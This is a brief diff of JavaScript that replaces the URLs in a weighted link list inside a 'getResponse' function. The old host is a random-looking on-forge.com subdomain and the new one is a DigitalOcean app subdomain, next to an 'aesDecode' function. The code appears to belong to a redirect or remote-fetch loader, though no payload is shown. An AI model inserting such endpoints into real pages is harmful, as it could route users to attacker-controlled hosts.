@@ -72,8 +72,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://aflkgdnksdfkjd.on-forge.com/", weight: 0.5 },
-        { url: "https://aflkgdnksdfkjd.on-forge.com/", weight: 0.5 }
+        { url: "https://king-prawn-app-3-awsmp.ondigitalocean.app/", weight: 0.5 },
+        { url: "https://king-prawn-app-3-awsmp.ondigitalocean.app/", weight: 0.5 }
       
     ];
 
